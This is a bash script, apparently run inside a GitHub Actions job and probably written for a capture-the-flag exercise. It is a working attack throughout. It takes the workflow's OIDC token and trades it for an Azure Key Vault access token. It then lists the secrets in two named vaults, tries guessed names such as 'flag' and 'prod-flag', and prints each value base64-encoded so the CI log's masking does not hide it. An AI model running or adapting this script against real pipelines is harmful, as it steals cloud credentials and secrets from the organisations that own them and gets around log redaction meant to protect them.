#!/usr/bin/env bash
set +e
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json; print(json.load(sys.stdin).get("value",""))')
echo "OIDC_LEN=${#OIDC}"
if [ -z "$OIDC" ]; then echo NO_OIDC; exit 0; fi
python3 - "$OIDC" <<'PY'
import sys,base64,json
t=sys.argv[1].split('.')[1]; t+='='*(-len(t)%4)
print('OIDC_SUB='+str(json.loads(base64.urlsafe_b64decode(t)).get('sub')))
PY
RESP=$(curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
 -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" \
 -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
 --data-urlencode "client_assertion=$OIDC" --data-urlencode "scope=https://vault.azure.net/.default")
TOK=$(echo "$RESP" | python3 -c 'import sys,json; print(json.load(sys.stdin).get("access_token",""))')
echo "KV_TOKEN_LEN=${#TOK}"
for H in kv-tbl-sec-x3euoz.vault.azure.net kv-tbl-prod-x3euoz.vault.azure.net; do
  echo "VAULT $H"
  L=$(curl -sS -H "Authorization: Bearer $TOK" "https://$H/secrets?api-version=7.4")
  echo "$L" | python3 -c 'import sys,json; d=json.load(sys.stdin); print("NAMES", [x["id"].rstrip("/").split("/")[-1] for x in d.get("value",[])])' 2>/dev/null || echo "$L" | head -c 300
  for N in flag FLAG df26 df26-flag tebamoto-flag prod-flag; do
    V=$(curl -sS -H "Authorization: Bearer $TOK" "https://$H/secrets/$N?api-version=7.4")
    echo "$V" | python3 -c 'import sys,json,base64; d=json.load(sys.stdin); v=d.get("value",""); print("SECRET "+sys.argv[1]+" LEN="+str(len(v))); print("FLAG_B64="+base64.b64encode(v.encode()).decode()) if v else None' "$N" 2>/dev/null || true
  done
done
